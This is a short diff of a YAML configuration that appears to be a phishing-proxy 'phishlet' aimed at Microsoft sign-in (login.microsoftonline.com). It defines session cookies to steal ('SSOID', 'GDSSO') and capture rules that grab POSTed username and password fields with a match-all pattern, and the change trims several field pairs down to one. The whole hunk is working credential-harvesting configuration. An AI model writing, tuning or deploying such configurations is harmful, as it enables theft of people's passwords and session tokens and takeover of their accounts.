@@ -87,30 +87,14 @@ auth_tokens:
     keys: ['SSOID', 'GDSSO']
 
 credentials:
-  - username:
-      key: 'login'
-      search: '(.*)'
-      type: 'post'
-    password:
-      key: 'passwd'
-      search: '(.*)'
-      type: 'post'
-  - username:
-      key: 'loginfmt'
-      search: '(.*)'
-      type: 'post'
-    password:
-      key: 'passwd'
-      search: '(.*)'
-      type: 'post'
-  - username:
-      key: 'username'
-      search: '(.*)'
-      type: 'post'
-    password:
-      key: 'password'
-      search: '(.*)'
-      type: 'post'
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
 
 login:
   domain: 'login.microsoftonline.com'
